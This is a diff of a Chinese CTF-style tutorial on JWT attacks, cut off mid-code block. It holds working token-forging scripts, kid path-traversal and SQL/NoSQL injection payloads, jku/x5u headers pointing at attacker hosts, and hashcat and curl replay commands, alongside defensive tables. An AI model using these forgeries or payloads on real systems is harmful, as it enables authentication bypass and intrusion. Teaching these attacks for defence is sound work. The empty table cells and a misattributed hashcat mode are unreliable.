-token = jwt.encode(
-    payload,
-    secret,
-    algorithm="HS256"
-)
-
+token = jwt.encode(payload, secret, algorithm="HS256",
+                   headers={"kid": "key-1"})  # 保留原始 Header
 print(token)
 ```
 
-安装 PyJWT：
-
-```bash
-pip install pyjwt
-```
-
-如果原 JWT 中存在特殊 Header，例如：
-
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT",
-  "kid": "key-1"
-}
-```
-
-生成令牌时也可以保留：
+#### 【实战四：手工计算 HS256（不依赖 PyJWT）】
 
 ```python
-token = jwt.encode(
-    payload,
-    secret,
-    algorithm="HS256",
-    headers={
-        "kid": "key-1"
-    }
-)
-```
+import base64, hashlib, hmac, json
 
----
+secret = b"爆破出的密钥"
+header = {"alg": "HS256", "typ": "JWT"}
+payload = {"username": "admin", "role": "admin"}
 
-## 1.6 手工生成 HS256 JWT
-
-为了理解 HS256 的签名过程，可以不用 PyJWT，直接使用 Python 标准库。
-
-```python
-import base64
-import hashlib
-import hmac
-import json
-
-secret = b"secret123"
-
-header = {
-    "alg": "HS256",
-    "typ": "JWT"
-}
-
-payload = {
-    "username": "admin",
-    "role": "admin",
-    "is_admin": True
-}
-
-def b64url_encode(data):
+def b64u_encode(data):
     return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
 
-header_b64 = b64url_encode(
-    json.dumps(
-        header,
-        separators=(",", ":")
-    ).encode()
-)
+h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
+p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
 
-payload_b64 = b64url_encode(
-    json.dumps(
-        payload,
-        separators=(",", ":")
-    ).encode()
-)
+signing_input = f"{h_b64}.{p_b64}".encode()
+signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
+sig_b64 = b64u_encode(signature)
 
-signing_input = f"{header_b64}.{payload_b64}".encode()
-
-signature = hmac.new(
-    secret,
-    signing_input,
-    hashlib.sha256
-).digest()
-
-signature_b64 = b64url_encode(signature)
-
-token = f"{header_b64}.{payload_b64}.{signature_b64}"
-
+token = f"{h_b64}.{p_b64}.{sig_b64}"
 print(token)
 ```
 
-其中：
+#### 【密钥爆破速度对比（不同算法）】
 
-```python
-separators=(",", ":")
-```
+| 算法 | 模式号 | Hashcat 速度 (RTX 4090) | 说明 |
+|:----:|:-----:|:----------------------:|------|
+| HS256 | 16500 | ~50 亿/秒 | 极快 |
+| SHA-256 | 1400 | ~100 亿/秒 | 无 HMAC 开销 |
+| bcrypt | 3200 | ~10 万/秒 | 极慢（设计如此） |
+| scrypt | 8900 | ~10 万/秒 | 内存硬函数 |
 
-用于去掉 JSON 中不必要的空格。
-
-JWT 签名保护的是编码后的原始内容，所以这些变化都会改变签名：
-
-1. JSON 中是否有空格。
-2. 字段顺序。
-3. 字符编码。
-4. Base64URL 是否去掉填充。
-5. Header 或 Payload 中的换行。
-
-只要使用相同的 Header、Payload 和密钥，服务器就可以验证签名。
+ **新手避坑**：
+- Hashcat 模式 `-m 16500` 只用于 HS 系列，不能爆破 RS 私钥
+- 注意 JSON 中 `separators=(",", ":")` 去掉空格，否则签名不同
+- 字段顺序变化也会导致签名不同
+- 手工验证时确保 `base64.urlsafe_b64decode` 正确处理填充
 
 ---
 
-## 1.7 RS256 与 HS256 算法混淆
+### 步骤 ④：Header 注入点
 
-RS256 使用：
+#### 4.1 `kid` 路径穿越
 
-```txt
-私钥签名
-公钥验证
-```
-
-HS256 使用：
-
-```txt
-同一个密钥签名和验证
-```
-
-错误实现可能根据用户控制的 `alg` 字段选择验证方法，同时把同一份 RSA 公钥交给验证函数。
-
-攻击流程：
-
-1. 原令牌使用 `RS256`。
-2. 服务器的 RSA 公钥可以获取。
-3. 把 Header 中的 `RS256` 改成 `HS256`。
-4. 把 RSA 公钥文件的完整内容当作 HMAC 密钥。
-5. 使用这个"密钥"生成 HS256 Signature。
-6. 如果服务器也把 RSA 公钥当成 HMAC 密钥，就会验证通过。
-
-原 Header：
-
-```json
-{
-  "alg": "RS256",
-  "typ": "JWT"
-}
-```
-
-修改为：
-
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
-```
-
-Payload 修改为：
-
-```json
-{
-  "username": "admin",
-  "role": "admin",
-  "is_admin": true
-}
-```
-
-使用公钥作为 HMAC 密钥（完整 Python 脚本）：
-
-```python
-import base64
-import hashlib
-import hmac
-import json
-
-with open("public.pem", "rb") as f:
-    public_key = f.read()
-
-header = {
-    "alg": "HS256",
-    "typ": "JWT"
-}
-
-payload = {
-    "username": "admin",
-    "role": "admin",
-    "is_admin": True
-}
-
-def b64url_encode(data):
-    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
-
-header_b64 = b64url_encode(
-    json.dumps(
-        header,
-        separators=(",", ":")
-    ).encode()
-)
-
-payload_b64 = b64url_encode(
-    json.dumps(
-        payload,
-        separators=(",", ":")
-    ).encode()
-)
-
-signing_input = f"{header_b64}.{payload_b64}".encode()
-
-signature = hmac.new(
-    public_key,
-    signing_input,
-    hashlib.sha256
-).digest()
-
-signature_b64 = b64url_encode(signature)
-
-token = f"{header_b64}.{payload_b64}.{signature_b64}"
-
-print(token)
-```
-
-成功需要同时满足：
-
-1. 原令牌使用 RSA 等非对称算法。
-2. 能拿到服务器验证时使用的公钥。
-3. 服务器允许从 `RS256` 切换成 `HS256`。
-4. 服务器没有把对称算法和非对称算法分开。
-5. 服务器错误地把 RSA 公钥当成 HMAC 密钥。
-6. 使用的公钥字节和服务器读取的内容完全一致。
-
-公钥可能出现在：
-
-```txt
-/public.pem
-/static/public.pem
-/.well-known/jwks.json
-/jwks.json
-源码
-配置文件
-Git 泄露
-错误信息
-```
-
-公钥公开本身不是漏洞。漏洞是服务器把公开的非对称公钥错误地用于对称 HMAC 验证。
-
-新版 JWT 库通常会阻止把 PEM 公钥当作 HMAC 密钥。本地 PyJWT 拒绝生成这种令牌时，可以使用上面的标准库脚本手工计算；但是目标服务器仍然必须存在算法混淆漏洞才能成功。
-
----
-
-## 1.8 `kid` 密钥编号利用
-
-`kid` 表示 Key ID，用来告诉服务器应该使用哪一个密钥。
-
-例如：
-
-```json
-{
-  "alg": "HS256",
-  "typ": "JWT",
-  "kid": "key-1"
-}
-```
-
-服务器可能写成：
+#### 【场景】服务器根据 `kid` 读取文件作为密钥。
 
 ```python
 key_path = "/app/keys/" + header["kid"]
 key = open(key_path, "rb").read()
-
-jwt.decode(
-    token,
-    key,
-    algorithms=["HS256"]
-)
 ```
 
-如果 `kid` 没有经过校验，就可能出现路径穿越。
+#### 【原理】`kid`（Key ID）用于告诉服务器使用哪个密钥。如果直接将 `kid` 拼接到文件路径，攻击者可以突破目录限制。
 
-例如：
+#### 【实战：指向 /dev/null 使密钥为空】
 
 ```json
-{
-  "alg": "HS256",
-  "typ": "JWT",
-  "kid": "../../../../dev/null"
-}
+{"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
 ```
 
-拼接后可能变成：
-
-```txt
-/app/keys/../../../../dev/null
-```
-
-最终指向：
-
-```txt
-/dev/null
-```
-
-Linux 中读取 `/dev/null` 通常得到空内容。如果服务器把读取到的空内容当作 HS256 密钥，就可以尝试使用空密钥签名。
+Linux 中 `/dev/null` 读取为空，空字节作为 HMAC 密钥：
 
 ```python
-secret = b""
+import hmac, hashlib
+signature = hmac.new(b"", signing_input, hashlib.sha256).digest()
 ```
 
-把前面的 HS256 脚本中的密钥改成空字节即可：
+**成功条件**：
+1. `kid` 直接拼接到文件路径，无过滤
+2. 路径穿越没有被过滤
+3. 服务器成功读取 `/dev/null`（Linux）或 `NUL`（Windows）
+4. 读取结果被直接当作密钥
+5. 空密钥被允许使用
 
-```python
-signature = hmac.new(
-    b"",
-    signing_input,
-    hashlib.sha256
-).digest()
+#### 【实战：指向 /etc/passwd 获知密钥内容】
+
+```json
+{"alg": "HS256", "typ": "JWT", "kid": "../../../../etc/passwd"}
 ```
 
-成功需要满足：
+如果密钥变为 `/etc/passwd` 的第一行内容，且攻击者知道 `/etc/passwd` 的内容，可以还原密钥并伪造令牌。
 
-1. `kid` 被直接拼接到文件路径。
-2. 路径穿越没有被过滤。
-3. 服务器成功读取 `/dev/null`。
-4. 读取结果被直接当成 HMAC 密钥。
-5. 服务器允许空密钥或没有检查密钥长度。
+#### 【kid 注入类型汇总】
 
-`kid` 还可能进入：
+| 注入类型 | payload | 效果 |
+|---------|---------|------|
+| 路径穿越 | `../../../../dev/null` | 空密钥 |
+| 路径穿越 | `../../../../etc/passwd` | 已知内容的密钥 |
+| SQL 注入 | `' OR 1=1 --` | 返回第一个密钥 |
+| NoSQL 注入 | `{"$ne": ""}` | MongoDB 中匹配非空 |
+| Redis 命令 | `\r\nGET key-name\r\n` | 命令注入（罕见） |
+| 空值 | 删除 `kid` 字段 | 使用默认密钥 |
 
-1. SQL 查询。
-2. NoSQL 查询。
-3. LDAP 查询。
-4. Redis Key。
-5. 文件名。
-6. 字典索引。
-7. 命令行参数。
-
-例如后端可能写成：
+#### 4.2 `kid` SQL/NoSQL 注入
 
 ```sql
-select secret from jwt_keys where kid = '用户输入'
+SELECT secret FROM jwt_keys WHERE kid = '用户输入'
 ```
 
-这时 `kid` 可能变成 SQL 注入点。
-
-但是不能看到 `kid` 就直接认定存在漏洞。正常实现可能只是：
-
-```python
-keys = {
-    "key-1": key1,
-    "key-2": key2
-}
-```
-
-然后严格判断 `kid` 是否在白名单中。
-
----
-
-## 1.9 `jku` Header 注入
-
-`jku` 表示 JWK Set URL，用于告诉服务器去哪里获取一组公钥。
-
-正常 Header：
+**SQLite 注入**：
 
 ```json
-{
-  "alg": "RS256",
-  "typ": "JWT",
-  "kid": "server-key-1",
-  "jku": "https://target/.well-known/jwks.json"
-}
+{"kid": "' UNION SELECT 'custom_key' --"}
 ```
 
-如果服务器直接相信用户控制的 `jku`，攻击者可以尝试改成自己的服务器：
+**MySQL 注入**：
 
 ```json
-{
-  "alg": "RS256",
-  "typ": "JWT",
-  "kid": "ctf-key",
-  "jku": "https://attacker.example/jwks.json"
-}
+{"kid": "' UNION SELECT 'custom_key' -- "}
 ```
 
-攻击流程：
+**MongoDB NoSQL 注入**（当 `kid` 作为 JSON 对象传入时）：
 
-1. 攻击者生成一对 RSA 密钥。
-2. 使用自己的私钥签发管理员 JWT。
-3. 把自己的公钥转换成 JWK。
-4. 把 JWK 放入 `jwks.json`。
-5. 在 Header 中把 `jku` 指向攻击者的 `jwks.json`。
-6. 保证 JWT Header 的 `kid` 和 JWKS 中的 `kid` 相同。
-7. 如果服务器信任这个地址，就可能使用攻击者公钥验证攻击者签名。
+```json
+{"kid": {"$gt": ""}}
+```
 
-生成 RSA 密钥：
+#### 4.3 `jku` 自建 JWKS 服务器
+
+#### 【场景】服务器信任 JWT Header 中的 `jku` 字段，从该 URL 获取公钥。
+
+#### 【原理】`jku`（JWK Set URL）指向一个包含公钥集合的 JSON 端点。如果服务端无条件相信攻击者提供的 URL，攻击者可以托管自己的公钥。
+
+#### 【实战】攻击者搭建自己的 JWKS 服务器。
 
 ```bash
-openssl genpkey \
-  -algorithm RSA \
-  -pkeyopt rsa_keygen_bits:2048 \
-  -out private.pem
+# 生成 RSA 密钥对
+openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem
+openssl pkey -in private.pem -pubout -out public.pem
 ```
-
-导出公钥：
-
-```bash
-openssl pkey \
-  -in private.pem \
-  -pubout \
-  -out public.pem
-```
-
-使用 PyJWT 生成 JWK 和伪造令牌（完整脚本）：
 
 ```python
-import json
-import jwt
-
+# 生成 JWK 和伪造 JWT
+import json, jwt
 from jwt.algorithms import RSAAlgorithm
 
 with open("private.pem", "rb") as f:
     private_key = f.read()
-
 with open("public.pem", "rb") as f:
     public_key = f.read()
 
-jwk = json.loads(
-    RSAAlgorithm.to_jwk(public_key)
-)
-
+# 生成 JWK
+jwk = json.loads(RSAAlgorithm.to_jwk(public_key))
 jwk["kid"] = "ctf-key"
-jwk["use"] = "sig"
 jwk["alg"] = "RS256"
 
-jwks = {
-    "keys": [
-        jwk
-    ]
-}
+# 保存 jwks.json
+with open("jwks.json", "w") as f:
+    json.dump({"keys": [jwk]}, f)
 
-with open("jwks.json", "w", encoding="utf-8") as f:
-    json.dump(jwks, f)
-
-payload = {
-    "username": "admin",
-    "role": "admin",
-    "is_admin": True
-}
-
-headers = {
-    "kid": "ctf-key",
-    "jku": "https://attacker.example/jwks.json"
-}
-
-token = jwt.encode(
-    payload,
-    private_key,
-    algorithm="RS256",
-    headers=headers
-)
-
+# 生成伪造 JWT
+headers = {"kid": "ctf-key", "jku": "https://attacker.com/jwks.json"}
+payload = {"username": "admin", "role": "admin", "is_admin": True}
+token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
 print(token)
 ```
 
-生成的 `jwks.json` 大致是：
+**完整的 jwks.json 格式**：
 
 ```json
 {
@@ -1197,423 +617,1247 @@ print(token)
       "kid": "ctf-key",
       "use": "sig",
       "alg": "RS256",
-      "n": "【RSA 模数】",
+      "n": "0vx7agoebGcQSuu...（Base64URL 编码的模数）",
       "e": "AQAB"
     }
   ]
 }
 ```
 
-成功需要满足：
+**注意事项**：即使不能伪造 JWT，任意 `jku` 也可能造成**SSRF**——目标服务器会根据用户提供的 URL 发起 HTTP 请求。
 
-1. 服务器会读取 JWT Header 中的 `jku`。
-2. 服务器允许访问攻击者控制的 URL。
-3. 服务器没有固定可信的 JWKS 域名。
-4. 服务器会使用返回的公钥验证令牌。
-5. Header 的 `kid` 能匹配 JWKS 中的密钥。
-6. 攻击者服务器能被目标访问。
+#### 4.4 `jwk` 直接嵌入公钥
 
-即使不能伪造 JWT，任意 `jku` 也可能造成 SSRF，因为目标服务器会根据用户提供的 URL 发起请求。
-
----
-
-## 1.10 `jwk` Header 注入
-
-`jwk` 允许直接在 JWT Header 中携带公钥。
-
-正常设计中，服务器不应该无条件相信用户自己提供的验证公钥。
-
-攻击 Header 可能类似：
+#### 【场景】服务器接受 Header 中直接携带的公钥。
 
 ```json
 {
   "alg": "RS256",
-  "typ": "JWT",
   "kid": "ctf-key",
   "jwk": {
     "kty": "RSA",
-    "kid": "ctf-key",
-    "use": "sig",
-    "alg": "RS256",
-    "n": "【攻击者公钥的 RSA 模数】",
+    "n": "攻击者公钥模数",
     "e": "AQAB"
   }
 }
 ```
 
-如果服务器直接使用 Header 中的 `jwk` 验证当前 JWT，就相当于允许攻击者说：
-
-```txt
-请使用我自己提供的公钥验证我自己生成的签名
-```
-
-攻击者使用对应私钥签名后，验证自然能够通过。
-
-使用前面生成的 `jwk`：
+攻击者用自己私钥签名，让服务器用自己提供的公钥验证。
 
 ```python
-headers = {
-    "kid": "ctf-key",
-    "jwk": jwk
-}
+headers = {"kid": "ctf-key", "jwk": jwk}
+token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
+```
 
-token = jwt.encode(
-    payload,
-    private_key,
-    algorithm="RS256",
-    headers=headers
-)
+**完整 JWK 流程生成脚本**：
 
+```python
+import json, jwt
+from jwt.algorithms import RSAAlgorithm
+
+# 生成密钥对
+private_key = """-----BEGIN RSA PRIVATE KEY-----
+...（base64 编码的私钥）...
+-----END RSA PRIVATE KEY-----"""
+
+public_key = """-----BEGIN PUBLIC KEY-----
+...（base64 编码的公钥）...
+-----END PUBLIC KEY-----"""
+
+# 将公钥转为 JWK
+jwk = json.loads(RSAAlgorithm.to_jwk(public_key.encode()))
+jwk["kid"] = "attacker-key"
+
+# 伪造 JWT，把 jwk 放 Header 里
+headers = {"kid": "attacker-key", "jwk": jwk}
+payload = {"username": "admin", "role": "admin", "is_admin": True}
+token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
 print(token)
 ```
 
-成功前提：
+#### 4.5 `x5u` 证书 URL 注入
 
-1. 服务器支持 Header 中的 `jwk`。
-2. 服务器没有判断该公钥是否可信。
-3. 服务器直接用攻击者提供的公钥验证签名。
-4. `alg`、`kid` 和密钥类型能够匹配。
+类似 `jku`，但指向 X.509 证书。
 
-如果服务器只使用本地保存的公钥，Header 中增加 `jwk` 不会产生效果。
+```json
+{"alg": "RS256", "x5u": "https://attacker.com/cert.pem"}
+```
+
+#### 【Header 注入攻击对比】
+
+| 字段 | 类型 | 攻击方式 | 是否需要出网 | SSRF 风险 |
+|:----:|:----:|---------|:-----------:|:---------:|
+| kid | string | 路径穿越 / SQL 注入 |  |  |
+| jku | URL | 自建 JWKS 服务器 |  |  |
+| jwk | JWK 对象 | 嵌入攻击者公钥 |  |  |
+| x5u | URL | 自建证书服务器 |  |  |
+| x5c | X.509 数组 | 嵌入攻击者证书 |  |  |
+
+`jku`、`jwk`、`x5u` 的共同核心问题：
+
+> 服务器是否信任了攻击者提供的验证密钥或密钥来源。
 
 ---
 
-## 1.11 `x5u` Header 注入
+### 步骤 ⑤：Claim 校验是否完整
 
-`x5u` 指向 X.509 证书或证书链的位置。
+即使签名验证通过，如果 Claim 校验不完整，仍可绕过。
 
-例如：
+#### 5.1 `exp` 过期时间
+
+```python
+# 跳过过期验证
+payload = jwt.decode(token, key, algorithms=["HS256"],
+                     options={"verify_exp": False})
+```
+
+**常见问题**：
+
+| 问题 | 说明 | 攻击方式 |
+|:----:|------|---------|
+| 不检查 exp | 服务端完全忽略 exp | 永久有效 |
+| 可选检查 | 只在 exp 存在时检查，但删除 exp 后通过 | 删除 exp 字段 |
+| 毫秒 vs 秒 | exp 使用毫秒，实际过期是 2099 年 | 看似已过期，实际还没 |
+| 字符串格式 | `"exp": "1760000000"`（字符串） | 类型不匹配绕过 |
+| 过大偏移 | 允许几分钟的时钟偏移 | 略微延长有效期 |
+
+**篡改思路**：`"exp": 4102444800`（约 2099 年，需有合法签名）
+
+#### 5.2 `nbf` (Not Before)
+
+`nbf` 控制令牌在指定时间之前不可用。不验证则可能提前使用未来令牌。
+
+```
+nbf: 1760000000  ← 2025-10-01 之前不可用
+如果不检查 nbf，立即使用也能通过
+```
+
+#### 5.3 `iss` (Issuer)
+
+不验证 `iss` 时，A 系统签发的令牌可能在 B 系统使用（如果密钥相同）。
+
+| 场景 | 风险 |
+|:----:|------|
+| 单一密钥多服务 | A 服务签发的 token 可用于 B 服务 |
+| 共享密钥池 | 攻击者注册的服务可签发冒充其他服务 |
+
+#### 5.4 `aud` (Audience)
+
+不验证 `aud` 时，发给普通 API 的令牌可用于管理 API。
 
 ```json
 {
+  "aud": "user-api",     ← 原本只用于 user-api
+  "admin": true
+}
+```
+
+如果管理 API `admin-api` 不检查 `aud`，该令牌也可调用。
+
+#### 5.5 `jti` (JWT ID)
+
+仅存在 `jti` 不会自动防止重放，服务器必须**后端记录已用 jti**。
+
+| jti 实现 | 是否防重放 | 说明 |
+|:--------:|:---------:|------|
+| 只有 jti 字段 |  | 未记录使用状态 |
+| 后端记录 + 滑动窗口 |  | 基于时间的检查 |
+| 后端黑名单 |  | 每次验证时查询 |
+| 短期 exp + jti |  | 缩小窗口但仍有风险 |
+
+---
+
+### 步骤 ⑥：令牌类型混淆
+
+#### 【场景】系统同时使用 Access Token、Refresh Token 和 ID Token，但验证逻辑相同。
+
+#### 【原理】三种令牌的结构都是 JWT，但用途不同。如果服务端仅验证签名而不区分令牌类型，可能被混淆使用。
+
+#### 【三种令牌对比】
+
+| 属性 | Access Token | Refresh Token | ID Token |
+|:----:|:-----------:|:-------------:|:--------:|
+| 主要用途 | 访问 API | 换取新的 Access Token | 身份标识（OIDC） |
+| 有效期 | 短（分钟~小时） | 长（天~月） | 短 |
+| 包含信息 | 用户身份+权限 | 无敏感信息 | 用户信息 |
+| 典型 `typ` | `at+jwt` | `rt+jwt` | `id_token` |
+| 是否可撤销 | 难（依赖过期） | 可（存储撤销列表） | 不适用 |
+
+#### 【类型混淆攻击流程】
+
+```
+1. 获得一个 Refresh Token（有效期长）
+2. 修改 payload 中的权限字段（如有）
+3. 将 Refresh Token 作为 Access Token 发送到 API 接口
+4. 如果服务器仅验证签名，不区分令牌类型 → 攻击成功
+```
+
+**防御方式**：
+
+```python
+# 1. 不同的 typ Claim
+headers = {"typ": "at+jwt"}  # Access Token
+headers = {"typ": "rt+jwt"}  # Refresh Token
+
+# 2. 不同的 aud
+payload = {"aud": "api"}     # Access Token
+payload = {"aud": "refresh"} # Refresh Token
+
+# 3. 验证 typ
+payload = jwt.decode(token, key, algorithms=["HS256"])
+if payload.get("typ") != "at+jwt":
+    raise Exception("invalid token type")
+```
+
+---
+
+### 步骤 ⑦：重放攻击
+
+JWT 签名只防篡改，不防复制。拿到一个合法令牌就可以直接重复使用。
+
+**常见泄露来源**：
+
+| 来源 | 说明 | 防护 |
+|:----:|------|------|
+| XSS 窃取 | 脚本读取 LocalStorage/Cookie | HttpOnly Cookie |
+| URL 参数 | JWT 出现在 URL 中（日志泄露） | 使用 Header 携带 |
+| 不安全的 HTTP | 明文传输被截获 | HTTPS |
+| Git 泄露 | 代码库中包含 JWT | .gitignore |
+| Bot 请求 | 管理员 Bot 的请求头泄漏 | 短期令牌 |
+| Referer 头 | JWT 在 URL 中时 Referer 泄露 | 不在 URL 中携带 |
+| 第三方脚本 | 页面中第三方 JS 读取 Storage | 不使用 localStorage |
+
+```bash
+# 直接重放管理员 JWT
+curl "http://target/admin" -H "Authorization: Bearer 管理员JWT..."
+```
+
+`exp` 只能限制重放的时间窗口，不能阻止窗口内的重放。
+
+---
+
+## 四、各语言 / 库常见 JWT 函数对照
+
+### 4.1 完整函数对照表
+
+| 语言/库 | 编码/签名 | 解码/验证 | 安装 |
+|---------|----------|----------|------|
+|**Python**(PyJWT) | `jwt.encode(payload, key, algorithm=...)` | `jwt.decode(token, key, algorithms=[...])` | `pip install pyjwt` |
+|**Python**(PyJWT 不验证) | - | `jwt.decode(token, options={"verify_signature": False})` | pyjwt |
+|**Python**(手工 HS256) | `hmac.new(key, data, hashlib.sha256).digest()` | 同上比较 | 标准库 |
+|**PHP**(firebase/php-jwt) | `JWT::encode($payload, $key, 'HS256')` | `JWT::decode($token, $key, ['HS256'])` | `composer require firebase/php-jwt` |
+|**PHP**(lcobucci/jwt 4.x) | `new IssuedBy()->withClaim(...)->getToken()` | `$parser->parse($token)->claims()` | `composer require lcobucci/jwt` |
+|**Node.js**(jsonwebtoken) | `jwt.sign(payload, secret, {algorithm: 'HS256'})` | `jwt.verify(token, secret, {algorithms: ['HS256']})` | `npm install jsonwebtoken` |
+|**Node.js**(jose) | `new SignJWT(payload).setProtectedHeader({alg:'HS256'}).sign(secret)` | `jwtVerify(token, key)` | `npm install jose` |
+|**Go**(golang-jwt) | `jwt.NewWithClaims(jwt.SigningMethodHS256, claims)` | `jwt.Parse(token, keyFunc)` | Go 标准扩展 |
+|**Java**(jjwt 0.12+) | `Jwts.builder().signWith(key).compact()` | `Jwts.parser().verifyWith(key).build().parseClaimsJws(token)` | Maven 依赖 |
+|**Ruby**(ruby-jwt) | `JWT.encode(payload, secret, 'HS256')` | `JWT.decode(token, secret, true, {algorithm: 'HS256'})` | `gem install jwt` |
+|**Rust**(jsonwebtoken) | `encode(&Header::default(), &claims, &secret)` | `decode::<Claims>(&token, &secret, &Validation::default())` | Cargo 依赖 |
+
+### 4.2 各库常见陷阱
+
+| 库 | 常见陷阱 | 说明 |
+|:---:|---------|------|
+| PyJWT | `algorithms` 未指定 | 从 Header 读 alg（攻击者可控） |
+| firebase/php-jwt | 使用 HTTP 协议获取 jku | 可能被 MitM 攻击 |
+| jsonwebtoken (Node) | 未指定 algorithms | 接受任意算法 |
+| golang-jwt | keyFunc 未验证算法 | 接收混合算法 |
+| jjwt (Java) | 使用旧版 parser() | 不验证 exp 默认 |
+
+### 4.3 PyJWT 常用操作速查
+
+```python
+# 仅读取（不验证）
+header = jwt.get_unverified_header(token)
+payload = jwt.decode(token, options={"verify_signature": False})
+
+# 验证 HS256
+payload = jwt.decode(token, secret, algorithms=["HS256"])
+
+# 验证并要求 exp
+payload = jwt.decode(token, secret, algorithms=["HS256"],
+                     options={"require": ["exp"]})
+
+# 验证 + iss + aud
+payload = jwt.decode(token, secret, algorithms=["HS256"],
+                     issuer="https://auth.target",
+                     audience="admin-api")
+
+# 错误：从 header 中读取 alg 来验证（攻击者可控制）
+header = jwt.get_unverified_header(token)
+payload = jwt.decode(token, key, algorithms=[header["alg"]])
+```
+
+---
+
+## 五、避坑汇总
+
+| 编号 | 坑 | 正确做法 |
+|:---:|----|---------|
+| 1 | 解码成功 = 令牌合法 | 解码只是 Base64URL，任何人都能解码 |
+| 2 | 拿到 JWT 先爆破密钥 | 先测试是否验证签名（改 Payload 不重签） |
+| 3 | 改 Payload 后服务端不理 | 可能改错了令牌位置（Header vs Cookie） |
+| 4 | `alg=none` 一定能绕过 | 只在库或服务器配置错误时有效 |
+| 5 | 公钥泄露 = 密钥泄露 | 非对称算法中公钥公开没事，算法混淆才有事 |
+| 6 | `kid` 一定有漏洞 | 正常实现可能是白名单字典 |
+| 7 | `jti` 能防重放 | 需要后端保存使用状态才能防 |
+| 8 | RS256 JWT 可被爆破 | Hashcat `-m 16500` 只适用于 HS 系列 |
+| 9 | 只检查 JWT 签名就够 | 还要检查 exp、nbf、iss、aud |
+| 10 | JWT 在 HTTPS 下就安全 | 泄露渠道不止网络截获 |
+| 11 | 所有令牌类型都一样 | Access Token、Refresh Token、ID Token 用途不同 |
+| 12 | `jku` 只能看不能打 | 即使不能伪造 JWT，`jku` 也可能造成 SSRF |
+| 13 | 空密钥肯定被拒绝 | 有些实现允许空密钥（`/dev/null` 绕过） |
+| 14 | HS256 密钥长度不重要 | 弱密钥（如 `secret`）可被秒级爆破 |
+| 15 | 签名验证=完全安全 | 业务逻辑和 Claim 校验同样重要 |
+| 16 | JWT 字段顺序不影响 | JSON 字段顺序改变会导致签名不同 |
+| 17 | `kid` 只用于查找密钥 | 还可能拼入 SQL、命令行、路径 |
+| 18 | 所有 JWT 库默认安全 | 许多库默认配置存在漏洞 |
+
+---
+
+## 六、知识总结表
+
+### 攻击方法速查
+
+| 攻击方法 | 前提条件 | 难度 | 常用工具 |
+|---------|---------|:---:|---------|
+| 跳过签名验证 | 服务端 `verify_signature=False` | 低 | Python 手工修改 |
+| `alg=none` | 库接受 none 算法 | 低 | Python 手工生成 |
+| HS 弱密钥 | HS 系列 + 易猜密钥 | 中 | Hashcat `-m 16500` |
+| 算法混淆 | RS256 + 公钥可获取 + 未分离算法 | 中 | Python + public.pem |
+| `kid` 路径穿越 | `kid` 拼入文件路径 | 中 | Python + `/dev/null` |
+| `kid` SQL 注入 | `kid` 拼入 SQL | 中 | SQL 注入 payload |
+| `jku` 注入 | 服务器信任 `jku` 并请求外部 URL | 高 | OpenSSL + HTTP 服务器 |
+| `jwk` 注入 | 服务器信任 Header 中的公钥 | 中 | Python + RSAAlgorithm |
+| `x5u` 注入 | 服务器信任 `x5u` 证书 URL | 高 | OpenSSL + HTTP 服务器 |
+| Claim 绕过 | 服务端不校验 exp/iss/aud | 低 | Python 修改 Payload |
+| 令牌类型混淆 | 不区分 Access/Refresh/ID Token | 中 | 修改 typ Claim |
+| 重放攻击 | 已有合法令牌 | 低 | curl 直接发送 |
+
+### Hashcat JWT 相关模式
+
+| 模式号 | 算法 | 示例 |
+|:-----:|------|------|
+| 16500 | JWT (HS256/HS384/HS512) | `hashcat -m 16500 jwt.txt wordlist.txt` |
+| 16600 | JWT (RS256/RS384/RS512) | 不适用于弱密钥爆破 |
+
+### 数字签名算法特点
+
+| 算法 | 签名大小 | 验证速度 | 密钥生成 | CTF 常见度 |
+|:----:|:-------:|:--------:|:--------:|:---------:|
+| HS256 | 32 字节 | 极快 | 共享密钥 |  |
+| RS256 | 256 字节 | 中等 | 慢（RSA） |  |
+| ES256 | 64 字节 | 快 | 快（EC） |  |
+| PS256 | 256 字节 | 慢（PSS） | 慢（RSA） |  |
+| EdDSA | 64 字节 | 极快 | 快 |  |
+
+### 安全防御对照
+
+| 防御措施 | 防止的攻击 |
+|---------|-----------|
+| 固定算法白名单 | `alg=none`、算法混淆 |
+| 验证签名 | 直接修改 Payload |
+| 强密钥 (≥256 bit) | HS 系列弱密钥爆破 |
+| 限制 `kid` 为白名单 | 路径穿越、SQL 注入 |
+| 禁用 `jku`/`jwk`/`x5u` | Header 注入 |
+| 验证 exp/nbf/iss/aud | Claim 绕过 |
+| 后端记录 jti 使用状态 | 重放攻击 |
+| HTTPS 传输 | 中间人窃取 |
+| HttpOnly Cookie | XSS 窃取 JWT |
+| 区分令牌类型 | 类型混淆攻击 |
+| 短有效期 | 缩小重放窗口 |
+
+### JWT 标准 Claim 速查
+
+| Claim | 全称 | 类型 | 说明 |
+|:-----:|:----:|:----:|------|
+| `iss` | Issuer | string | 令牌签发者 URL |
+| `sub` | Subject | string | 令牌主体（通常是用户 ID） |
+| `aud` | Audience | string/array | 令牌接收方 |
+| `exp` | Expiration Time | numeric | 过期时间（Unix 时间戳） |
+| `nbf` | Not Before | numeric | 在此时间之前无效 |
+| `iat` | Issued At | numeric | 签发时间 |
+| `jti` | JWT ID | string | 令牌唯一标识 |
+| `typ` | Type | string | 令牌类型（`JWT`、`at+jwt` 等） |
+
+### 快速验证命令
+
+```bash
+# 在 Linux 中查看公钥
+cat public.pem
+
+# 生成 RSA 密钥对（用于 jku/jwk 攻击）
+openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
+openssl pkey -in private.pem -pubout -out public.pem
+
+# 手动解码 JWT
+echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d 2>/dev/null || \
+echo 'eyJhbGciOiJIUzI1NiJ9' | python3 -c "import sys,base64; print(base64.urlsafe_b64decode(sys.stdin.read()+'=='))"
+
+# 完整解码 JWT（不验证）
+python3 -c "
+import jwt
+token = 'eyJ...完整JWT...'
